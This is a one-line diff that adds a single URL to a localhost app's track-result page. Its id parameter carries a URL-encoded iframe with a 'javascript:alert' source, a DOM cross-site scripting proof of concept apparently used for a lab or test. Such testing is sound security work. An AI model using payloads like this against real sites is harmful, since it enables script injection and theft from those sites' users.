@@ -1,0 +1,1 @@
+http://localhost:8080/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E
